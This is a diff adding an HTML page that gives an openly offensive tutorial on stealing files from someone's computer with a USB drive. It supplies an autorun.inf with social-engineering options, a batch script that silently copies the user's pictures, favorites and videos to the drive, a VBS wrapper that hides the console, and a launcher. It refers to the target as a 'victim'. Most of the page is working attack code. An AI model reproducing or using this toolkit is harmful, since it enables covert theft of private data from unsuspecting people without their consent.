@@ -1,0 +1,74 @@
+<html>
+<style>
+
+body{ margin:0; padding:0; 
+
+font-family: 'Open Sans', sans-serif;
+font-family: 'Slabo 27px', serif;
+}
+
+.wrapper {
+    background: #141518;
+    color: #f2f2f2;
+	padding:20px;
+}
+
+
+.para {
+    background: #34373c none repeat scroll 0 0;
+    border-radius: 10px;
+    clear: both;
+    margin-bottom: 15px;
+    margin-left: auto;
+    margin-right: auto;
+    max-width: 900px;
+    overflow: hidden;
+    padding: 0 20px;
+}
+
+.para h2 {
+    font-size: 30px;
+}
+.para  p {
+    font-size: 16px;
+	line-height:24px;
+}
+
+
+.ul-title {
+    font-size: 20px;
+    font-weight: bold;
+}
+
+/*.wrapper p{ margin:0;}
+*/
+
+</style>
+
+<body>
+<div class="wrapper">
+<div class="para">
+<p><strong>How to copy (steal) files from a computer to a pendrive</strong></p>
+<p><strong>STEP 1</strong><br /> Open Notepad (I recommend Notepad++) and copy-paste the following lines.</p>
+<p>[autorun]<br /> icon=<span class="skimlinks-unlinked">drive.ico</span><br /> open=<span class="skimlinks-unlinked">launch.bat</span><br /> action=Click OK to Run<br /> shell\open\command=<span class="skimlinks-unlinked">launch.bat</span><br /> Save this as <span class="skimlinks-unlinked">autorun.inf</span></p>
+<p>The icon line is optional. You can change the icon to your tastes or leave it to the default icon. It&rsquo;s useful for social engineering purposes like enticing the user to click a file on the drive by making it looks like a game or something.</p>
+<p>The &ldquo;action=&rdquo; command is optional too but sometimes when the autorun launches it may ask the user what to open. Depending on what you put here the user will be instructed to click Ok or run the file. This code acts as a backup just in case the user is asked what to open. This is not required if you are operating the computer.</p>
+<p>The &ldquo;shell/open command&rdquo; also acts as a backup in case the user clicks cancel instead of open when prompted. This code will execute when the drive letter is clicked on.</p>
+<p><strong>STEP 2</strong><br /> Open Notepad again and copy-paste the following lines</p>
+<p>@echo off<br /> :: variables<br /> /min<br /> SET odrive=%odrive:~0,2%<br /> set backupcmd=xcopy /s /c /d /e /h /i /r /y<br /> echo off<br /> %backupcmd% &ldquo;%USERPROFILE%\pictures&rdquo; &ldquo;%drive%\all\My pics&rdquo;<br /> %backupcmd% &ldquo;%USERPROFILE%\Favorites&rdquo; &ldquo;%drive%\all\Favorites&rdquo;<br /> %backupcmd% &ldquo;%USERPROFILE%\videos&rdquo; &ldquo;%drive%\all\vids&rdquo;<br /> @echo off<br /> cls<br /> Save this as <span class="skimlinks-unlinked">file.bat</span></p>
+<p>This file is configured to copy the contents of the current users pictures, favorites, and videos folder to the Flash drive under a folder called &ldquo;all&rdquo;. This is the section of the code you will need to edit depending on what you want to copy.</p>
+<p>The first file path &ldquo;%USERPROFILE%\pictures&rdquo; &ndash; is the target.<br /> The second file path &ldquo;%drive%\all\My pics&rdquo; &ndash; is the destination.</p>
+<p><strong>STEP 3</strong><br /> Open Notepad once again and copy-paste the following line.</p>
+<p>CreateObject(&ldquo;<span class="skimlinks-unlinked">Wscript.Shell&rdquo;).Run</span> &ldquo;&rdquo;&rdquo;&rdquo; &amp; WScript.Arguments(0) &amp; &ldquo;&rdquo;&rdquo;&rdquo;, 0, False<br /> Save this as <span class="skimlinks-unlinked">invisible.vbs</span></p>
+<p>This code runs the <span class="skimlinks-unlinked">file.bat</span> as a process so it does not show the CMD prompt and everything the batch file is processing.</p>
+<p><strong>STEP 4</strong><br /> Open Notepad one last time and copy-paste the following line.</p>
+<p><span class="skimlinks-unlinked">wscript.exe</span> \<span class="skimlinks-unlinked">invisible.vbs</span> <span class="skimlinks-unlinked">file.bat</span><br /> Save this as <span class="skimlinks-unlinked">launch.bat</span></p>
+<p>This batch file does two things, it looks for the <span class="skimlinks-unlinked">invisible.vbs</span> file in the root of the Flash drive then loads it with <span class="skimlinks-unlinked">file.bat</span> so <span class="skimlinks-unlinked">file.bat</span> is run with code from vbs file.</p>
+<p><strong>STEP 5</strong><br /> Copy all 4 files created in the above steps and put it on the root of the Flash drive, including the icon file if needed. Also create a folder named &ldquo;all&rdquo; where the contents are to be copied automatically. You can call this folder by any name, but then you need to reflect the changes you made in step 2.</p>
+<p>This is all that needs to be done. Test the Flash drive on your own computer first before playing it out on your victim. It works flawlessly.</p>
+</div>
+</div>
+</body>
+</html>
+
+
